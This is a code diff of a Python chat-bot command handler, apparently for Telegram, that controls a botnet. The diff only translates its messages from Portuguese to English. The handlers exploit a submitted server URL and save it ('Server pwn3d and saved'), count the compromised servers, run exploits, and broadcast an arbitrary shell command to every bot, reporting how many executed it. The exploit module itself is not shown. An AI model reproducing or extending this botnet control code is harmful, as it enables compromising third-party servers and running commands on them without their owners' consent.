@@ -20,19 +20,19 @@ class actions:
     def add(self,):
             splited = self.msg.split(' ',1)
             if len(splited) < 2:
-                self.bot.sendMessage(self.chat_id,'Ta errado essa merda, presta atencao!')
+                self.bot.sendMessage(self.chat_id,'There is something wrong pay attention!!')
             else:
                 url = splited[1]
                 print url
                 response = self.xpl.add(url)
                 if response:
-                    self.bot.sendMessage(self.chat_id,'Ownado e salvo com sucesso')
+                    self.bot.sendMessage(self.chat_id,'Server pwn3d and saved.')
                 else:
-                    self.bot.sendMessage(self.chat_id,'Mano nem consegui exploitar ein :/')
+                    self.bot.sendMessage(self.chat_id,'Sorry, i can not exploit it')
 
     def total(self,):
         totalServer = self.xpl.total()
-        self.bot.sendMessage(self.chat_id,'Manolo, temos %d servidores na nossa botnet ' % totalServer)
+        self.bot.sendMessage(self.chat_id,'Bro, we have %d server in our botnet' % totalServer)
 
     def exploit(self,):
         splited = self.msg.split(' ',1)
@@ -44,15 +44,15 @@ class actions:
             if response:
                 self.bot.sendMessage(self.chat_id,response)
             else:
-                self.bot.sendMessage(self.chat_id,'Mano deu algum erro, da uma olhada nos logs :/')
+                self.bot.sendMessage(self.chat_id,'Bro there is something going wrong, sorry :/')
         else:
-            self.bot.sendMessage(self.chat_id,'Ta errado essa merda, presta atencao!')
+            self.bot.sendMessage(self.chat_id,'There is something wrong pay attention!')
     def botnet(self,):
         splited = self.msg.split(' ',1)
         if len(splited) < 2:
-            self.bot.sendMessage(self.chat_id,'Ta errado essa merda, presta atencao!')
+            self.bot.sendMessage(self.chat_id,'There is something wrong pay attention!')
         else:
             cmd = splited[1]
             totalExec = self.xpl.botnet(cmd)
             totalServer = self.xpl.total()
-            self.bot.sendMessage(self.chat_id,'Mano, saca so, o comando que mandou foi executado em %d/%d servidores.' %(totalExec,totalServer))
+            self.bot.sendMessage(self.chat_id,'Bro, pay attention, the command you sent was executed in %d/%d servers.' %(totalExec,totalServer))
